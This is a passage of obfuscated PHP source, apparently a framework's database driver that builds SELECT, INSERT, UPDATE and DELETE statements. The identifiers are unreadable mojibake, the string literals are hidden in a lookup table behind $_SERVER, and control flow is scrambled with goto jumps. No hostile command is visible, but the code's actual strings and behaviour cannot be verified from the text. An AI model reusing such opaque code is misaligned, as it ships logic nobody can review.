(!preg_match($A˘ÿØ‹«ë◊[993], trim($Eä¡ª•’éÖ))) { think_exception(think_lang($A˘ÿØ‹«ë◊[994]) . $A˘ÿØ‹«ë◊[4] . $Eä¡ª•’éÖ); } $Cùπ‚ÙûÁŸ = is_array($D¯œ°Éœ˜ß) && isset($D¯œ°Éœ˜ß[$A˘ÿØ‹«ë◊[995]]); $Eä¡ª•’éÖ = trim($Eä¡ª•’éÖ); if (strpos($Eä¡ª•’éÖ, $A˘ÿØ‹«ë◊[281])) { $Aœç…¬Öåœ = explode($A˘ÿØ‹«ë◊[281], $Eä¡ª•’éÖ); $d‰¿∑æêπ∏ = array(); foreach ($Aœç…¬Öåœ as $B≤ä‚ç∏â  => $f¿ª∞°ﬂ˘ø) { $eÈÜä≈√€“ = $Cùπ‚ÙûÁŸ ? $D¯œ°Éœ˜ß[$B≤ä‚ç∏â ] : $D¯œ°Éœ˜ß; $d‰¿∑æêπ∏[] = $A˘ÿØ‹«ë◊[258] . $this->parseWhereItem($this->parseKey($f¿ª∞°ﬂ˘ø), $eÈÜä≈√€“) . $A˘ÿØ‹«ë◊[895]; } $b ¿Õ√£è¥ .= implode($A˘ÿØ‹«ë◊[996], $d‰¿∑æêπ∏); } elseif (strpos($Eä¡ª•’éÖ, $A˘ÿØ‹«ë◊[282])) { $Aœç…¬Öåœ = explode($A˘ÿØ‹«ë◊[282], $Eä¡ª•’éÖ); $d‰¿∑æêπ∏ = array(); foreach ($Aœç…¬Öåœ as $B≤ä‚ç∏â  => $f¿ª∞°ﬂ˘ø) { $eÈÜä≈√€“ = $Cùπ‚ÙûÁŸ ? $D¯œ°Éœ˜ß[$B≤ä‚ç∏â ] : $D¯œ°Éœ˜ß; $d‰¿∑æêπ∏[] = $A˘ÿØ‹«ë◊[258] . $this->parseWhereItem($this->parseKey($f¿ª∞°ﬂ˘ø), $eÈÜä≈√€“) . $A˘ÿØ‹«ë◊[895]; } $b ¿Õ√£è¥ .= implode($A˘ÿØ‹«ë◊[991], $d‰¿∑æêπ∏); } else { $b ¿Õ√£è¥ .= $this->parseWhereItem($this->parseKey($Eä¡ª•’éÖ), $D¯œ°Éœ˜ß); } } $b ¿Õ√£è¥ .= $A˘ÿØ‹«ë◊[276] . $E«î∂¬ﬂéà; } $b ¿Õ√£è¥ = substr($b ¿Õ√£è¥, 0, -strlen($E«î∂¬ﬂéà)); } return empty($b ¿Õ√£è¥) ? $A˘ÿØ‹«ë◊[33] : $A˘ÿØ‹«ë◊[997] . $b ¿Õ√£è¥; } protected function parseWhereItem($eèàµÉ∏çÁ, $E≤Í§‹åú¶) { $Bû‰‡ÂÊÍä =& $_SERVER[’ÿƒ†ïò]; $Dâˆ≈‰ﬂ§Ω = $Bû‰‡ÂÊÍä[33]; if (is_array($E≤Í§‹åú¶)) { if (is_string($E≤Í§‹åú¶[0])) { $E ⁄¯‹¥ˆÎ = strtolower($E≤Í§‹åú¶[0]); if (in_array($E≤Í§‹åú¶[0], array($Bû‰‡ÂÊÍä[981], $Bû‰‡ÂÊÍä[998], $Bû‰‡ÂÊÍä[999], $Bû‰‡ÂÊÍä[1000], $Bû‰‡ÂÊÍä[1001], $Bû‰‡ÂÊÍä[1002]))) { $Dâˆ≈‰ﬂ§Ω .= $eèàµÉ∏çÁ . $Bû‰‡ÂÊÍä[50] . $E≤Í§‹åú¶[0] . $Bû‰‡ÂÊÍä[50] . $this->parseValue($E≤Í§‹åú¶[1]); } elseif (preg_match($Bû‰‡ÂÊÍä[1003], $E≤Í§‹åú¶[0])) { $Dâˆ≈‰ﬂ§Ω .= $eèàµÉ∏çÁ . $Bû‰‡ÂÊÍä[50] . $this->exp[$E ⁄¯‹¥ˆÎ] . $Bû‰‡ÂÊÍä[50] . $this->parseValue($E≤Í§‹åú¶[1]); } elseif (preg_match($Bû‰‡ÂÊÍä[1004], $E≤Í§‹åú¶[0])) { if (is_array($E≤Í§‹åú¶[1])) { $cÁÚÔ®®ÿﬂ = isset($E≤Í§‹åú¶[2]) ? strtoupper($E≤Í§‹åú¶[2]) : $Bû‰‡ÂÊÍä[989]; if (in_array($cÁÚÔ®®ÿﬂ, array($Bû‰‡ÂÊÍä[988], $Bû‰‡ÂÊÍä[989], $Bû‰‡ÂÊÍä[990]))) { $aê∫âÀ∆üŒ = array(); foreach ($E≤Í§‹åú¶[1] as $a∑ÇÁËúèÌ) { $aê∫âÀ∆üŒ[] = $eèàµÉ∏çÁ . $Bû‰‡ÂÊÍä[50] . $this->exp[$E ⁄¯‹¥ˆÎ] . $Bû‰‡ÂÊÍä[50] . $this->parseValue($a∑ÇÁËúèÌ); } $Dâˆ≈‰ﬂ§Ω .= $Bû‰‡ÂÊÍä[258] . implode($Bû‰‡ÂÊÍä[50] . $cÁÚÔ®®ÿﬂ . $Bû‰‡ÂÊÍä[50], $aê∫âÀ∆üŒ) . $Bû‰‡ÂÊÍä[895]; } } else { $Dâˆ≈‰ﬂ§Ω .= $eèàµÉ∏çÁ . $Bû‰‡ÂÊÍä[50] . $this->exp[$E ⁄¯‹¥ˆÎ] . $Bû‰‡ÂÊÍä[50] . $this->parseValue($E≤Í§‹åú¶[1]); } } elseif ($Bû‰‡ÂÊÍä[295] == $E ⁄¯‹¥ˆÎ) { $Dâˆ≈‰ﬂ§Ω .= $Bû‰‡ÂÊÍä[893] . $eèàµÉ∏çÁ . $Bû‰‡ÂÊÍä[50] . $E≤Í§‹åú¶[1] . $Bû‰‡ÂÊÍä[1005]; } elseif (preg_match($Bû‰‡ÂÊÍä[1006], $E≤Í§‹åú¶[0])) { $Dâˆ≈‰ﬂ§Ω .= $E≤Í§‹åú¶[0]; } elseif (preg_match($Bû‰‡ÂÊÍä[1007], $E≤Í§‹åú¶[0])) { if (isset($E≤Í§‹åú¶[2]) && $Bû‰‡ÂÊÍä[295] == $E≤Í§‹åú¶[2]) { $Dâˆ≈‰ﬂ§Ω .= $eèàµÉ∏çÁ . $Bû‰‡ÂÊÍä[50] . $this->exp[$E ⁄¯‹¥ˆÎ] . $Bû‰‡ÂÊÍä[50] . $E≤Í§‹åú¶[1]; } else { if (is_string($E≤Í§‹åú¶[1])) { $E≤Í§‹åú¶[1] = explode($Bû‰‡ÂÊÍä[47], $E≤Í§‹åú¶[1]); } $E§‚Öù≤À≤ = implode($Bû‰‡ÂÊÍä[47], $this->parseValue($E≤Í§‹åú¶[1])); $Dâˆ≈‰ﬂ§Ω .= $eèàµÉ∏çÁ . $Bû‰‡ÂÊÍä[50] . $this->exp[$E ⁄¯‹¥ˆÎ] . $Bû‰‡ÂÊÍä[893] . $E§‚Öù≤À≤ . $Bû‰‡ÂÊÍä[895]; } } elseif (preg_match($Bû‰‡ÂÊÍä[1008], $E≤Í§‹åú¶[0])) { $A˜√∞ÊãÉ∂ = is_string($E≤Í§‹åú¶[1]) ? explode($Bû‰‡ÂÊÍä[47], $E≤Í§‹åú¶[1]) : $E≤Í§‹åú¶[1]; $Dâˆ≈‰ﬂ§Ω .= $Bû‰‡ÂÊÍä[893] . $eèàµÉ∏çÁ . $Bû‰‡ÂÊÍä[50] . $this->exp[$E ⁄¯‹¥ˆÎ] . $Bû‰‡ÂÊÍä[50] . $this->parseValue($A˜√∞ÊãÉ∂[0]) . $Bû‰‡ÂÊÍä[991] . $this->parseValue($A˜√∞ÊãÉ∂[1]) . $Bû‰‡ÂÊÍä[276]; } else { think_exception(think_lang($Bû‰‡ÂÊÍä[994]) . $Bû‰‡ÂÊÍä[4] . $E≤Í§‹åú¶[0]); } } else { $Cµ†ƒÖû·ô = count($E≤Í§‹åú¶); $FÑ◊è ùÁÁ = $Bû‰‡ÂÊÍä[33]; if (is_string($E≤Í§‹åú¶[$Cµ†ƒÖû·ô - 1])) { $FÑ◊è ùÁÁ = isset($E≤Í§‹åú¶[$Cµ†ƒÖû·ô - 1]) ? strtoupper($E≤Í§‹åú¶[$Cµ†ƒÖû·ô - 1]) : $Bû‰‡ÂÊÍä[33]; if (in_array($FÑ◊è ùÁÁ, array($Bû‰‡ÂÊÍä[988], $Bû‰‡ÂÊÍä[989], $Bû‰‡ÂÊÍä[990]))) { $Cµ†ƒÖû·ô = $Cµ†ƒÖû·ô - 1; } } else { $FÑ◊è ùÁÁ = $Bû‰‡ÂÊÍä[988]; } for ($FäŸ·∏ä„Ô = 0; $FäŸ·∏ä„Ô < $Cµ†ƒÖû·ô; $FäŸ·∏ä„Ô++) { $A˜√∞ÊãÉ∂ = is_array($E≤Í§‹åú¶[$FäŸ·∏ä„Ô]) ? $E≤Í§‹åú¶[$FäŸ·∏ä„Ô][1] : $E≤Í§‹åú¶[$FäŸ·∏ä„Ô]; if ($Bû‰‡ÂÊÍä[295] == strtolower($E≤Í§‹åú¶[$FäŸ·∏ä„Ô][0])) { $Dâˆ≈‰ﬂ§Ω .= $Bû‰‡ÂÊÍä[258] . $eèàµÉ∏çÁ . $Bû‰‡ÂÊÍä[50] . $A˜√∞ÊãÉ∂ . $Bû‰‡ÂÊÍä[1005] . $FÑ◊è ùÁÁ . $Bû‰‡ÂÊÍä[50]; } else { $aÜÛ«ﬁ∑¶õ = is_array($E≤Í§‹åú¶[$FäŸ·∏ä„Ô]) ? $this->exp[strtolower($E≤Í§‹åú¶[$FäŸ·∏ä„Ô][0])] : $Bû‰‡ÂÊÍä[981]; if (!$aÜÛ«ﬁ∑¶õ && is_array($E≤Í§‹åú¶[$FäŸ·∏ä„Ô]) && in_array($E≤Í§‹åú¶[$FäŸ·∏ä„Ô][0], array($Bû‰‡ÂÊÍä[981], $Bû‰‡ÂÊÍä[998], $Bû‰‡ÂÊÍä[999], $Bû‰‡ÂÊÍä[1000], $Bû‰‡ÂÊÍä[1001], $Bû‰‡ÂÊÍä[1002]))) { $aÜÛ«ﬁ∑¶õ = $E≤Í§‹åú¶[$FäŸ·∏ä„Ô][0]; } $Dâˆ≈‰ﬂ§Ω .= $Bû‰‡ÂÊÍä[258] . $eèàµÉ∏çÁ . $Bû‰‡ÂÊÍä[50] . $aÜÛ«ﬁ∑¶õ . $Bû‰‡ÂÊÍä[50] . $this->parseValue($A˜√∞ÊãÉ∂) . $Bû‰‡ÂÊÍä[1005] . $FÑ◊è ùÁÁ . $Bû‰‡ÂÊÍä[50]; } } $Dâˆ≈‰ﬂ§Ω = substr($Dâˆ≈‰ﬂ§Ω, 0, -4); } } else { $Dâˆ≈‰ﬂ§Ω .= $eèàµÉ∏çÁ . $Bû‰‡ÂÊÍä[1009] . $this->parseValue($E≤Í§‹åú¶); } return $Dâˆ≈‰ﬂ§Ω; } protected function parseThinkWhere($dâ”∞ã¯Ûı, $A∫èñÈπçï) { $aπå·ƒ∂äç =& $_SERVER[’ÿƒ†ïò]; $Aç©—õ’Œë = $aπå·ƒ∂äç[33]; switch ($dâ”∞ã¯Ûı) { case $aπå·ƒ∂äç[350]: $Aç©—õ’Œë = $A∫èñÈπçï; break; case $aπå·ƒ∂äç[992]: $Aç©—õ’Œë = is_string($A∫èñÈπçï) ? $A∫èñÈπçï : substr($this->parseWhere($A∫èñÈπçï), 6); break; case $aπå·ƒ∂äç[1010]: parse_str($A∫èñÈπçï, $Dâ©Ñ©§„ü); if (isset($Dâ©Ñ©§„ü[$aπå·ƒ∂äç[987]])) { $eÍµÖêë‚® = $aπå·ƒ∂äç[50] . strtoupper($Dâ©Ñ©§„ü[$aπå·ƒ∂äç[987]]) . $aπå·ƒ∂äç[50]; unset($Dâ©Ñ©§„ü[$aπå·ƒ∂äç[987]]); } else { $eÍµÖêë‚® = $aπå·ƒ∂äç[991]; } $E¡ÑÓØ∞€ = array(); foreach ($Dâ©Ñ©§„ü as $AºŒ¨ÉÆ≥∑ => $aíäΩ˘Í≥Ü) { $E¡ÑÓØ∞€[] = $this->parseKey($AºŒ¨ÉÆ≥∑) . $aπå·ƒ∂äç[1009] . $this->parseValue($aíäΩ˘Í≥Ü); } $Aç©—õ’Œë = implode($eÍµÖêë‚®, $E¡ÑÓØ∞€); break; } return $Aç©—õ’Œë; } protected function parseLimit($F¨êƒŸ≈‹ê) { $B—Ÿó§éíÜ =& $_SERVER[’ÿƒ†ïò]; return !empty($F¨êƒŸ≈‹ê) ? $B—Ÿó§éíÜ[48] . $F¨êƒŸ≈‹ê . $B—Ÿó§éíÜ[50] : $B—Ÿó§éíÜ[33]; } protected function parseJoin($a•∏√í∞ÃÌ) { $e†ê≈ã«¥» =& $_SERVER[’ÿƒ†ïò]; $E—Æ‹áÂÂ˘ = $e†ê≈ã«¥»[33]; if (!empty($a•∏√í∞ÃÌ)) { if (is_array($a•∏√í∞ÃÌ)) { foreach ($a•∏√í∞ÃÌ as $bÑ˜∂äáæÆ => $dÉßÊ–å†Á) { if (!1 !== stripos($dÉßÊ–å†Á, $e†ê≈ã«¥»[1011])) { $E—Æ‹áÂÂ˘ .= $e†ê≈ã«¥»[50] . $dÉßÊ–å†Á; } else { $E—Æ‹áÂÂ˘ .= $e†ê≈ã«¥»[1012] . $dÉßÊ–å†Á; } } } else { $E—Æ‹áÂÂ˘ .= $e†ê≈ã«¥»[1012] . $a•∏√í∞ÃÌ; } } $E—Æ‹áÂÂ˘ = preg_replace($e†ê≈ã«¥»[1013], think_config($e†ê≈ã«¥»[919]) . $e†ê≈ã«¥»[1014], $E—Æ‹áÂÂ˘); return $E—Æ‹áÂÂ˘; } protected function parseOrder($A≈ùúåŸìÇ) { $eÀõ“íÑ•ñ =& $_SERVER[’ÿƒ†ïò]; if (is_array($A≈ùúåŸìÇ)) { $d·∆§‹ü÷ê = array(); foreach ($A≈ùúåŸìÇ as $aü è„ùùÎ => $bÊûù‡è œ) { if (is_numeric($aü è„ùùÎ)) { $d·∆§‹ü÷ê[] = $this->parseKey($bÊûù‡è œ); } else { $bÊûù‡è œ = in_array(strtoupper(trim($bÊûù‡è œ)), array($eÀõ“íÑ•ñ[1015], $eÀõ“íÑ•ñ[1016])) ? $eÀõ“íÑ•ñ[50] . $bÊûù‡è œ : $eÀõ“íÑ•ñ[33]; if (preg_match($eÀõ“íÑ•ñ[1017], $aü è„ùùÎ)) { $d·∆§‹ü÷ê[] = $this->parseKey($aü è„ùùÎ) . $bÊûù‡è œ; } else { think_exception($eÀõ“íÑ•ñ[1018] . $aü è„ùùÎ); } } } $A≈ùúåŸìÇ = implode($eÀõ“íÑ•ñ[47], $d·∆§‹ü÷ê); } return !empty($A≈ùúåŸìÇ) ? $eÀõ“íÑ•ñ[1019] . $A≈ùúåŸìÇ : $eÀõ“íÑ•ñ[33]; } protected function parseGroup($b¯ŸÉé—É¬) { $cÆ¶ö·Ç‹Î =& $_SERVER[’ÿƒ†ïò]; return !empty($b¯ŸÉé—É¬) ? $cÆ¶ö·Ç‹Î[1020] . $b¯ŸÉé—É¬ : $cÆ¶ö·Ç‹Î[33]; } protected function parseHaving($D—ÊõÚ¨ºò) { $F¢∆≠ À∫Ê =& $_SERVER[’ÿƒ†ïò]; return !empty($D—ÊõÚ¨ºò) ? $F¢∆≠ À∫Ê[1021] . $D—ÊõÚ¨ºò : $F¢∆≠ À∫Ê[33]; } protected function parseComment($dèËœﬂí“ì) { $c•îÆ…‡ùé =& $_SERVER[’ÿƒ†ïò]; return !empty($dèËœﬂí“ì) ? $c•îÆ…‡ùé[1022] . $dèËœﬂí“ì . $c•îÆ…‡ùé[1023] : $c•îÆ…‡ùé[33]; } protected function parseDistinct($eéøË™áç”) { $Då° ¿í§Ø =& $_SERVER[’ÿƒ†ïò]; return !empty($eéøË™áç”) ? $Då° ¿í§Ø[1024] : $Då° ¿í§Ø[33]; } protected function parseUnion($A™è¿ÀﬁÛ÷) { $FÂí…¥÷Ö˜ =& $_SERVER[’ÿƒ†ïò]; if (empty($A™è¿ÀﬁÛ÷)) { return $FÂí…¥÷Ö˜[33]; } if (isset($A™è¿ÀﬁÛ÷[$FÂí…¥÷Ö˜[346]])) { $D∆´ç¨è§Ç = $FÂí…¥÷Ö˜[1025]; unset($A™è¿ÀﬁÛ÷[$FÂí…¥÷Ö˜[346]]); } else { $D∆´ç¨è§Ç = $FÂí…¥÷Ö˜[1026]; } foreach ($A™è¿ÀﬁÛ÷ as $fäóû‚≠∫Ù) { $B≠‚é⁄πﬂä[] = $D∆´ç¨è§Ç . (is_array($fäóû‚≠∫Ù) ? $this->buildSelectSql($fäóû‚≠∫Ù) : $fäóû‚≠∫Ù); } return implode($FÂí…¥÷Ö˜[50], $B≠‚é⁄πﬂä); } public function insert($E◊ÿêè±À∂, $düÀœÃª— = array(), $CéÌû£äÚ‹ = false) { goto Féü≤¬Üª´; CÍ◊÷íéƒó: foreach ($E◊ÿêè±À∂ as $AÑ±ÉÍπÛÓ => $A´ÀåÉ∑é–) { if (is_array($A´ÀåÉ∑é–) && $Bπ≈‰§◊”≠[295] == $A´ÀåÉ∑é–[0]) { $eäÊïœÓèí[] = $this->parseKey($AÑ±ÉÍπÛÓ); $C™°‚“ó¡Ç[] = $A´ÀåÉ∑é–[1]; } elseif (is_scalar($A´ÀåÉ∑é–) || is_null($A´ÀåÉ∑é–)) { $eäÊïœÓèí[] = $this->parseKey($AÑ±ÉÍπÛÓ); $C™°‚“ó¡Ç[] = $this->parseValue($A´ÀåÉ∑é–); } } $AöõÁàÔ®⁄ = ($CéÌû£äÚ‹ ? $Bπ≈‰§◊”≠[897] : $Bπ≈‰§◊”≠[898]) . $Bπ≈‰§◊”≠[899] . $this->parseTable($düÀœÃª—[$Bπ≈‰§◊”≠[277]]) . $Bπ≈‰§◊”≠[893] . implode($Bπ≈‰§◊”≠[47], $eäÊïœÓèí) . $Bπ≈‰§◊”≠[894] . implode($Bπ≈‰§◊”≠[47], $C™°‚“ó¡Ç) . $Bπ≈‰§◊”≠[895]; $AöõÁàÔ®⁄ .= $this->parseLock(isset($düÀœÃª—[$Bπ≈‰§◊”≠[842]]) ? $düÀœÃª—[$Bπ≈‰§◊”≠[842]] : !1); goto C´»“ÖÁüü; C´»“ÖÁüü: $AöõÁàÔ®⁄ .= $this->parseComment(!empty($düÀœÃª—[$Bπ≈‰§◊”≠[352]]) ? $düÀœÃª—[$Bπ≈‰§◊”≠[352]] : $Bπ≈‰§◊”≠[33]); return $this->execute($AöõÁàÔ®⁄, $this->parseBind(!empty($düÀœÃª—[$Bπ≈‰§◊”≠[283]]) ? $düÀœÃª—[$Bπ≈‰§◊”≠[283]] : array())); goto E‡ïÃﬂÎπ∫; Féü≤¬Üª´: $Bπ≈‰§◊”≠ =& $_SERVER[’ÿƒ†ïò]; $C™°‚“ó¡Ç = $eäÊïœÓèí = array(); $this->model = $düÀœÃª—[$Bπ≈‰§◊”≠[279]]; goto CÍ◊÷íéƒó; E‡ïÃﬂÎπ∫: } public function selectInsert($bë’¬≈äΩ¶, $A›ﬂÖâÏÿÿ, $Föﬂ∆Ê€∞ö = array()) { goto E∑ÿ√Ñºµ™; E∑ÿ√Ñºµ™: $eÆÇÉ∆Êâ√ =& $_SERVER[’ÿƒ†ïò]; $this->model = $Föﬂ∆Ê€∞ö[$eÆÇÉ∆Êâ√[279]]; if (is_string($bë’¬≈äΩ¶)) { $bë’¬≈äΩ¶ = explode($eÆÇÉ∆Êâ√[47], $bë’¬≈äΩ¶); } goto a¥‰ãœ‹ıÜ; a¥‰ãœ‹ıÜ: array_walk($bë’¬≈äΩ¶, array($this, $eÆÇÉ∆Êâ√[896])); $F“áö‰Øœº = $eÆÇÉ∆Êâ√[1027] . $this->parseTable($A›ﬂÖâÏÿÿ) . $eÆÇÉ∆Êâ√[893] . implode($eÆÇÉ∆Êâ√[47], $bë’¬≈äΩ¶) . $eÆÇÉ∆Êâ√[1005]; $F“áö‰Øœº .= $this->buildSelectSql($Föﬂ∆Ê€∞ö); goto D˜§õ± ¿Ú; D˜§õ± ¿Ú: return $this->execute($F“áö‰Øœº, $this->parseBind(!empty($Föﬂ∆Ê€∞ö[$eÆÇÉ∆Êâ√[283]]) ? $Föﬂ∆Ê€∞ö[$eÆÇÉ∆Êâ√[283]] : array())); goto F™†ÀŒ“ŒÌ; F™†ÀŒ“ŒÌ: } public function update($fÓ¢åπ¯ÿ“, $E¿ÌÙ≈–¨’) { $CèáŒ´á◊å =& $_SERVER[’ÿƒ†ïò]; $this->model = $E¿ÌÙ≈–¨’[$CèáŒ´á◊å[279]]; $cá®≤ôÕ–È = $CèáŒ´á◊å[1028] . $this->parseTable($E¿ÌÙ≈–¨’[$CèáŒ´á◊å[277]]) . $this->parseSet($fÓ¢åπ¯ÿ“) . $this->parseWhere(!empty($E¿ÌÙ≈–¨’[$CèáŒ´á◊å[273]]) ? $E¿ÌÙ≈–¨’[$CèáŒ´á◊å[273]] : $CèáŒ´á◊å[33]) . $this->parseOrder(!empty($E¿ÌÙ≈–¨’[$CèáŒ´á◊å[363]]) ? $E¿ÌÙ≈–¨’[$CèáŒ´á◊å[363]] : $CèáŒ´á◊å[33]) . $this->parseLimit(!empty($E¿ÌÙ≈–¨’[$CèáŒ´á◊å[290]]) ? $E¿ÌÙ≈–¨’[$CèáŒ´á◊å[290]] : $CèáŒ´á◊å[33]) . $this->parseLock(isset($E¿ÌÙ≈–¨’[$CèáŒ´á◊å[842]]) ? $E¿ÌÙ≈–¨’[$CèáŒ´á◊å[842]] : !1) . $this->parseComment(!empty($E¿ÌÙ≈–¨’[$CèáŒ´á◊å[352]]) ? $E¿ÌÙ≈–¨’[$CèáŒ´á◊å[352]] : $CèáŒ´á◊å[33]); return $this->execute($cá®≤ôÕ–È, $this->parseBind(!empty($E¿ÌÙ≈–¨’[$CèáŒ´á◊å[283]]) ? $E¿ÌÙ≈–¨’[$CèáŒ´á◊å[283]] : array())); } public function delete($aÆûŸﬂôèã = array()) { $Eê¯¿Øç¥» =& $_SERVER[’ÿƒ†ïò]; $this->model = $aÆûŸﬂôèã[$Eê¯¿Øç¥»[279]]; $C≈≠–”æÛ≤ = $Eê¯¿Øç¥»[1029] . $this->parseTable($aÆûŸﬂôèã[$Eê¯¿Øç¥»[277]]) . $this->parseWhere(!empty($aÆûŸﬂôèã[$Eê¯¿Øç¥»[273]]) ? $aÆûŸﬂôèã[$Eê¯¿Øç¥»[273]] : $Eê¯¿Øç¥»[33]) . $this->parseOrder(!empty($aÆûŸﬂôèã[$Eê¯¿Øç¥»[363]]) ? $aÆûŸﬂôèã[$Eê¯¿Øç¥»[363]] : $Eê¯¿Øç¥»[33]) . $this->parseLimit(!empty($aÆûŸﬂôèã[$Eê¯¿Øç¥»[290]]) ? $aÆûŸﬂôèã[$Eê¯¿Øç¥»[290]] : $Eê¯¿Øç¥»[33]) . $this->parseLock(isset($aÆûŸﬂôèã[$Eê¯¿Øç¥»[842]]) ? $aÆûŸﬂôèã[$Eê¯¿Øç¥»[842]] : !1) . $this->parseComment(!empty($aÆûŸﬂôèã[$Eê¯¿Øç¥»[352]]) ? $aÆûŸﬂôèã[$Eê¯¿Øç¥»[352]] : $Eê¯¿Øç¥»[33]); return $this->execute($C≈≠–”æÛ≤, $this->parseBind(!empty($aÆûŸﬂôèã[$Eê¯¿Øç¥»[283]]) ? $aÆûŸﬂôèã[$Eê¯¿Øç¥»[283]] : array())); } public function select($cÚêò∑≥îΩ = array()) { goto b„∫Õº∏±ê; b„∫Õº∏±ê: $E† ÍØñ◊î =& $_SERVER[’ÿƒ†ïò]; $this->model = $cÚêò∑≥îΩ[$E† ÍØñ◊î[279]]; $b¥ıùÕ—ƒ… = $this->buildSelectSql($cÚêò∑≥îΩ); goto Bµ·ÑΩø≈; Bµ·ÑΩø≈: $dµ¬…ÈóœÔ = isset($cÚêò∑≥îΩ[$E† ÍØñ◊î[347]]) ? $cÚêò∑≥îΩ[$E† ÍØñ◊î[347]] : !1; if ($dµ¬…ÈóœÔ) { $eµÉáã´ºÂ = is_string($dµ¬…ÈóœÔ[$E† ÍØñ◊î[93]]) ? $dµ¬…ÈóœÔ[$E† ÍØñ◊î[93]] : $E† ÍØñ◊î[1030] . md5($b¥ıùÕ—ƒ…); $bä¿éÒóƒí = think_cache($eµÉáã´ºÂ, $E† ÍØñ◊î[33], $dµ¬…ÈóœÔ); if (!1 !== $bä¿éÒóƒí) { return $bä¿éÒóƒí; } } $FâÕÂàòÛÃ = $this->query($b¥ıùÕ—ƒ…, $this->parseBind(!empty($cÚêò∑≥îΩ[$E† ÍØñ◊î[283]]) ? $cÚêò∑≥îΩ[$E† ÍØñ◊î[283]] : array())); goto c€–»ºíÆâ; c€–»ºíÆâ: if ($dµ¬…ÈóœÔ && !1 !== $FâÕÂàòÛÃ) { think_cache($eµÉáã´ºÂ, $FâÕÂàòÛÃ, $dµ¬…ÈóœÔ); } return $FâÕÂàòÛÃ; goto d¥â≈·éƒ; d¥â≈·éƒ: } public function buildSelectSql($c–áŒÇ‡Ã◊ = array()) { goto aÉøˆ®“Æî; aÉøˆ®“Æî: $AòÔ≈£ß—€ =& $_SERVER[’ÿƒ†ïò]; if (isset($c–áŒÇ‡Ã◊[$AòÔ≈£ß—€[351]])) { if (strpos($c–áŒÇ‡Ã◊[$AòÔ≈£ß—€[351]], $AòÔ≈£ß—€[47])) { list($Bñºô•ÏÔ¨, $a· ¢ƒç£Á) = explode($AòÔ≈£ß—€[47], $c–áŒÇ‡Ã◊[$AòÔ≈£ß—€[351]]); } else { $Bñºô•ÏÔ¨ = $c–áŒÇ‡Ã◊[$AòÔ≈£ß—€[351]]; } $Bñºô•ÏÔ¨ = $Bñºô•ÏÔ¨ ? $Bñºô•ÏÔ¨ : 1; $a· ¢ƒç£Á = isset($a· ¢ƒç£Á) ? $a· ¢ƒç£Á : (is_numeric($c–áŒÇ‡Ã◊[$AòÔ≈£ß—€[290]]) ? $c–áŒÇ‡Ã◊[$AòÔ≈£ß—€[290]] : 20); $aØ—Œ—ÊŒã = $a· ¢ƒç£Á * ((int) $Bñºô•ÏÔ¨ - 1); $c–áŒÇ‡Ã◊[$AòÔ≈£ß—€[290]] = $aØ—Œ—ÊŒã . $AòÔ≈£ß—€[47] . $a· ¢ƒç£Á; } if (think_config($AòÔ≈£ß—€[1031])) { $AÔæÆƒöƒ≥ = $AòÔ≈£ß—€[1032] . md5(serialize($c–áŒÇ‡Ã◊)); $CÜÜ∆◊ıÿƒ = think_cache($AÔæÆƒöƒ≥); if ($CÜÜ∆◊ıÿƒ) { return $CÜÜ∆◊ıÿƒ; } } goto aé¡Â¯∫‹È; aé¡Â¯∫‹È: $A∫¯éô´∆ƒ = $this->parseSql($this->selectSql, $c–áŒÇ‡Ã◊); $A∫¯éô´∆ƒ .= $this->parseLock(isset($c–áŒÇ‡Ã◊[$AòÔ≈£ß—€[842]]) ? $c–áŒÇ‡Ã◊[$AòÔ≈£ß—€[842]] : !1); if (isset($AÔæÆƒöƒ≥)) { think_cache($AÔæÆƒöƒ≥, $A∫¯éô´∆ƒ); } goto DñŒªàÎíô; DñŒªàÎíô: return $A∫¯éô´∆ƒ; goto F¥ãè±ÊÀ¬; F¥ãè±ÊÀ¬: } public function parseSql($dá¯‹ˆ–Ñé, $a©ÑÔ™Û¡ø = array()) { $E«Íê≠Ê¥ù =& $_SERVER[’ÿƒ†ïò]; $dá¯‹ˆ–Ñé = str_replace(array($E«Íê≠Ê¥ù[1033], $E«Íê≠Ê¥ù[1034], $E«Íê≠Ê¥ù[1035], $E«Íê≠Ê¥ù[1036], $E«Íê≠Ê¥ù[1037], $E«Íê≠Ê¥ù[1038], $E«Íê≠Ê¥ù[1039], $E«Íê≠Ê¥ù[1040], $E«Íê≠Ê¥ù[1041], $E«Íê≠Ê¥ù[1042], $E«Íê≠Ê¥ù[1043]), array($this->parseTable("{$a©ÑÔ™Û¡ø[$E«Íê≠Ê¥ù[277]]}"), $this->parseDistinct(isset($a©ÑÔ™Û¡ø[$E«Íê≠Ê¥ù[1044]]) ? $a©ÑÔ™Û¡ø[$E«Íê≠Ê¥ù[1044]] : !1), $this->parseField(!empty($a©ÑÔ™Û¡ø[$E«Íê≠Ê¥ù[271]]) ? $a©ÑÔ™Û¡ø[$E«Íê≠Ê¥ù[271]] : $E«Íê≠Ê¥ù[182]), $this->parseJoin(!empty($a©ÑÔ™Û¡ø[$E«Íê≠Ê¥ù[280]]) ? $a©ÑÔ™Û¡ø[$E«Íê≠Ê¥ù[280]] : $E«Íê≠Ê¥ù[33]), $this->parseWhere(!empty($a©ÑÔ™Û¡ø[$E«Íê≠Ê¥ù[273]]) ? $a©ÑÔ™Û¡ø[$E«Íê≠Ê¥ù[273]] : $E«Íê≠Ê¥ù[33]), $this->parseGroup(!empty($a©ÑÔ™Û¡ø[$E«Íê≠Ê¥ù[509]]) ? $a©ÑÔ™Û¡ø[$E«Íê≠Ê¥ù[509]] : $E«Íê≠Ê¥ù[33]), $this->parseHaving(!empty($a©ÑÔ™Û¡ø[$E«Íê≠Ê¥ù[1045]]) ? $a©ÑÔ™Û¡ø[$E«Íê≠Ê¥ù[1045]] : $E«Íê≠Ê¥ù[33]), $this->parseOrder(!empty($a©ÑÔ™Û¡ø[$E«Íê≠Ê¥ù[363]]) ? $a©ÑÔ™Û¡ø[$E«Íê≠Ê¥ù[363]] : $E«Íê≠Ê¥ù[33]), $this->parseLimit(!empty($a©ÑÔ™Û¡ø[$E«Íê≠Ê¥ù[290]]) ? $a©ÑÔ™Û¡ø[$E«Íê≠Ê¥ù[290]] : $E«Íê≠Ê¥ù[33]), $this->parseUnion(!empty($a©ÑÔ™Û¡ø[$E«Íê≠Ê¥ù[345]]) ? $a©ÑÔ™Û¡ø[$E«Íê≠Ê¥ù[345]] : $E«Íê≠Ê¥ù[33]), $this->parseComment(!empty($a©ÑÔ™Û¡ø[$E«Íê≠Ê¥ù[352]]) ? $a©ÑÔ™Û¡ø[$E«Íê≠Ê¥ù[352]] : 